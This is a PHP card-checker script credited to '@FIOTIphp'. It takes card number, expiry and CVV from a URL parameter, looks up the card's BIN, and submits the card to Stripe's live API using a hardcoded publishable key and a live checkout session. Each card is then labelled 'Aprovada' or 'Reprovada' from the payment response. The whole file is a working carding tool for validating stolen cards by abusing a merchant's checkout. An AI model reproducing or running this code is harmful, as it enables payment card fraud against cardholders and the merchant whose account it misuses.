<?php
error_reporting(0);

function getStr($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

$card=explode("|",$_GET['lista']);
$cc=$card[0];
$time = time();
$bin = substr($cc, 0, 2);
$mes=$card[1];
$ano=$card[2];
$cvv=$card[3];

/*/ 

CRÉDITOS PELA MODIFICAÇÃO: @FIOTIphp

/*/

$bin = substr($cc, 0, 6); 

$file = 'bins.csv'; 

$searchfor = $bin; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
  $encontrada = implode("\n", $matches[0]); 
} 
$pieces = explode(";", $encontrada); 
$c = count($pieces); 
if ($c == 8) { 
  $pais = $pieces[4]; 
  $paiscode = $pieces[5]; 
  $banco = $pieces[2]; 
  $level = $pieces[3]; 
  $bandeira = $pieces[1]; 
}else { 
  $pais = $pieces[5]; 
  $paiscode = $pieces[6]; 
  $level = $pieces[4]; 
  $banco = $pieces[2]; 
  $bandeira = $pieces[1]; 
} 
 
$bin_end = "$bandeira $banco $level $pais";
$bin=substr($cc,0,6);

//Hosts BB

    $host          = 'https://3d.payten.com.tr/mdpaympi/MerchantServer';
    $auth          = 'https://emv3dsauth1.secureacs.com/acs2web/acs2sicredi/authentication';
    $inicio        = 'https://emv3dsauth1.secureacs.com/acs2web/acs2sicredi/issuerincludes/logoIssuer.SICREDI.png';
    $customer      = 'https://emv3dsauth1.secureacs.com/acs2web/acsincludes/logoBrand_Visa.jpg';
    $r_customer    = 'https://emv3dsauth1.secureacs.com/acs2web/acs2sicredi/';    




//________________________//
//token

//________________________//

//Gate
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]=carlos+gomes&billing_details[email]=zielamz12%40gmail.com&billing_details[address][country]=BR&guid=8db01602-3510-41c8-ad88-fb994d8d3f286a29cc&muid=c9bc6888-80ac-4a67-baed-1643383830b4e48592&sid=f37ee4d5-6558-4f7e-95d5-206cdf52954dc9b104&key=pk_live_51LPCi7GKQjJs6COInFjyKEtpGYESnqLygJm90gyXLCbjwBhaPwa62WMaAm3PfuLySi2qwiAmaU7ETUNeSznRGuAP00RgyoMy6R&payment_user_agent=stripe.js%2F99e8a7e982%3B+stripe-js-v3%2F99e8a7e982%3B+payment-link%3B+checkout');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36';
$headers[] = 'Origin: https://checkout.stripe.com';
$headers[] = 'Referer: https://checkout.stripe.com/';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$stripe = curl_exec($ch);

$id = getStr($stripe, 'id": "','"' , 1);


//echo $stripe;

//////////PAGAMENTO///////
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/cs_live_a1NzTqttAEIdr9SLek1U65ClAAha00XtqirJx2I7Y3RVQzSm8pNEGUFTS8/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$id.'&expected_amount=100&last_displayed_line_item_group_details[subtotal]=100&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=pk_live_51LPCi7GKQjJs6COInFjyKEtpGYESnqLygJm90gyXLCbjwBhaPwa62WMaAm3PfuLySi2qwiAmaU7ETUNeSznRGuAP00RgyoMy6R');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36';
$headers[] = 'Origin: https://checkout.stripe.com';
$headers[] = 'Referer: https://checkout.stripe.com/';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$pay = curl_exec($ch);



echo $pay;


if (strpos($pay, 'security code is incorrect')!== false) {
	exit(" #Aprovada $cc|$mes|$ano|$cvv|  [Retorno: $msg]✔️ @FIOTIphp");
}else{
	exit(" #Reprovada $cc|$mes|$ano|$cvv| [Retorno: $msg]❌ @FIOTIphp");
}

?>
